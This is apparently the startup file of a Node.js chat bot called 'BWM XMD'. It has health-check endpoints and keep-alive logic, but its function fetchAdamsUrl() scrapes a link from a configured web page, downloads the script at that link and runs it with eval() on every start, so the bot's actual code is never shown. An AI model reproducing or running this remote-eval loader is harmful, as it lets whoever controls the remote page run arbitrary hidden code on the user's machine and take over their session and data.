//=====================//
//     Bwm xmd         //
//  Sir Ibrahim Adams  //
//=====================//




const axios = require('axios');
const cheerio = require('cheerio');
require('events').EventEmitter.defaultMaxListeners = 25;
const adams = require(__dirname + "/config");

// Configure port for scale-to-zero support
const PORT = process.env.PORT || 8080;
const http = require('http');
const express = require('express');
const app = express();

// Health check endpoints for scale-to-zero
app.get('/', (req, res) => {
  res.status(200).send('BWM XMD Bot Status: Online');
});

app.get('/health', (req, res) => {
  const status = {
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    bot: global.xmd && global.xmd.user ? 'connected' : 'disconnecting'
  };
  res.status(200).json(status);
});

// Ready check for scale-to-zero
app.get('/ready', (req, res) => {
  if (global.xmd && global.xmd.user) {
    res.status(200).json({ ready: true });
  } else {
    res.status(503).json({ ready: false });
  }
});
const server = http.createServer(app);
server.listen(PORT, '0.0.0.0', () => {
  console.log(`BWM XMD Bot Server running on port ${PORT}`);
});

// Connection monitoring and keep-alive system
let connectionRetries = 0;
const maxRetries = 5;

const checkConnection = async () => {
  try {
    if (global.xmd && global.xmd.user) {
      console.log("❒────────────━⊷\n║ʙᴡᴍ xᴍᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ\n╰────────────━⊷");
      connectionRetries = 0; // Reset retries on successful connection
    } else {
      connectionRetries++;
      console.log(`Connection attempt ${connectionRetries}/${maxRetries}`);
      
      if (connectionRetries >= maxRetries) {
        console.log("Attempting to reconnect...");
        // Trigger reconnection logic
        if (global.xmd) {
          await global.xmd.connect();
        }
        connectionRetries = 0;
      }
    }
  } catch (error) {
    console.error("Connection check error:", error);
  }
};

// Check connection status every 30 seconds
setInterval(checkConnection, 30000);

// Keep-alive ping every 2 minutes
setInterval(() => {
  if (global.xmd && global.xmd.user) {
    global.xmd.sendPresenceUpdate('available');
  }
}, 120000);

async function fetchAdamsUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const adamsUrlElement = $('a:contains("ADAM_URL")'); 
    const adamsUrl = adamsUrlElement.attr('href');

    if (!adamsUrl) {
      throw new Error('The URL link not found...');
    }

    console.log('You have successfully connected to the server ✅');

    const scriptResponse = await axios.get(adamsUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Fatal Error:', {
      message: error.message,
      stack: error.stack,
      timestamp: new Date().toISOString(),
      type: error.name,
      code: error.code || 'UNKNOWN'
    });

    // Attempt to recover or gracefully shutdown
    if (error.code === 'MODULE_NOT_FOUND') {
      console.error('Missing required module. Please check your dependencies.');
    } else if (error.code === 'ECONNREFUSED') {
      console.error('Connection refused. Please check your network connection.');
    }
  }
}

fetchAdamsUrl();